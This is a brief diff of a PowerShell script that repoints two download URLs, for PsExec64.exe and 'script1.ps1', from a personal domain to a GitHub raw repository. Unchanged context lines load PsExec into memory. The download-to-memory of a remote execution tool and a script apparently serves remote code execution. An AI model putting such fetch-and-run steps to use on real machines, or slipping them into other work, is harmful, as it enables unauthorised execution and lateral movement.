@@ -1,5 +1,5 @@
-$psexecUrl = "http://lenrad.io/img/PsExec64.exe"
-$scriptUrl = "http://lenrad.io/img/script1.ps1"
+$psexecUrl = "https://raw.githubusercontent.com/Lenard-Code/Scripts/refs/heads/main/Powershell/PsExec64.exe"
+$scriptUrl = "https://raw.githubusercontent.com/Lenard-Code/Scripts/refs/heads/main/Powershell/script1.ps1"
 # Download PsExec to memory
 $psexecBytes = (Invoke-WebRequest -Uri $psexecUrl).Content
 
